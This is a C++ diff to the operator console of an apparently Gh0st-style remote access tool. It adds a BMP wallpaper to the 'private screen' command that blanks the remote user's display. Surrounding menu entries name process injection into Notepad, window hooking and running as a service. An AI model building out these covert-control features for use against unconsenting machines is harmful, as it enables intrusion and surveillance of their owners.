@@ -575,6 +575,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
     ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
     ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
+    ON_COMMAND(ID_PARAM_PRIVACY_WALLPAPER, &CMy2015RemoteDlg::OnParamPrivacyWallpaper)
     ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
     ON_COMMAND(ID_HOOK_WIN, &CMy2015RemoteDlg::OnHookWin)
     ON_COMMAND(ID_RUNAS_SERVICE, &CMy2015RemoteDlg::OnRunasService)
@@ -4443,10 +4444,38 @@ void CMy2015RemoteDlg::OnOnlinePrivateScreen()
 
     std::string masterId = GetPwdHash(), hmac = GetHMAC();
 
-    BYTE bToken[101] = { TOKEN_PRIVATESCREEN };
-    memcpy(bToken + 1, masterId.c_str(), masterId.length());
-    memcpy(bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
-    SendSelectedCommand(bToken, sizeof(bToken));
+    // 读取壁纸文件（如果有）
+    std::vector<BYTE> bmpData;
+    if (!m_PrivateScreenWallpaper.IsEmpty()) {
+        CFile file;
+        if (file.Open(m_PrivateScreenWallpaper, CFile::modeRead | CFile::typeBinary)) {
+            ULONGLONG fileSize = file.GetLength();
+            if (fileSize > 0 && fileSize < 10 * 1024 * 1024) {  // 限制10MB
+                bmpData.resize((size_t)fileSize);
+                file.Read(bmpData.data(), (UINT)fileSize);
+            }
+            file.Close();
+        }
+    }
+
+    // 构建命令: TOKEN(1) + masterId(64) + hmac(16) + [bmpSize(4) + bmpData(N)]
+    size_t totalSize = 1 + 64 + 16;
+    if (!bmpData.empty()) {
+        totalSize += 4 + bmpData.size();
+    }
+
+    std::vector<BYTE> buffer(totalSize);
+    buffer[0] = TOKEN_PRIVATESCREEN;
+    memcpy(buffer.data() + 1, masterId.c_str(), masterId.length());
+    memcpy(buffer.data() + 1 + masterId.length(), hmac.c_str(), hmac.length());
+
+    if (!bmpData.empty()) {
+        DWORD bmpSize = (DWORD)bmpData.size();
+        memcpy(buffer.data() + 81, &bmpSize, 4);
+        memcpy(buffer.data() + 85, bmpData.data(), bmpData.size());
+    }
+
+    SendSelectedCommand(buffer.data(), (ULONG)buffer.size());
 }
 
 void CMy2015RemoteDlg::LoadListData(const std::string& group)
@@ -5041,6 +5070,40 @@ void CMy2015RemoteDlg::OnParamEnableLog()
     SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
     SendMasterSettings(nullptr, m_settings);
+}
+
+void CMy2015RemoteDlg::OnParamPrivacyWallpaper()
+{
+    CFileDialog dlg(TRUE, _T("bmp"), NULL,
+        OFN_FILEMUSTEXIST | OFN_HIDEREADONLY,
+        _T("BMP Files (*.bmp)|*.bmp|All Files (*.*)|*.*||"), this);
+
+    if (dlg.DoModal() == IDOK) {
+        CString path = dlg.GetPathName();
+
+        // 验证文件是否可以读取
+        CFile file;
+        if (!file.Open(path, CFile::modeRead | CFile::typeBinary)) {
+            MessageBox(_TR("无法读取指定的BMP文件，请检查文件是否存在或权限是否正确。"),
+                _TR("错误"), MB_ICONERROR);
+            return;
+        }
+
+        // 验证是否是有效的BMP文件
+        BITMAPFILEHEADER bmfh;
+        if (file.Read(&bmfh, sizeof(bmfh)) != sizeof(bmfh) || bmfh.bfType != 0x4D42) {
+            file.Close();
+            MessageBox(_TR("指定的文件不是有效的BMP格式。"),
+                _TR("错误"), MB_ICONERROR);
+            return;
+        }
+        file.Close();
+
+        m_PrivateScreenWallpaper = path;
+        CString msg;
+        msg.Format(_TR("隐私屏幕壁纸已设置为:\n%s"), path);
+        MessageBox(msg, _TR("设置成功"), MB_ICONINFORMATION);
+    }
 }
 
 
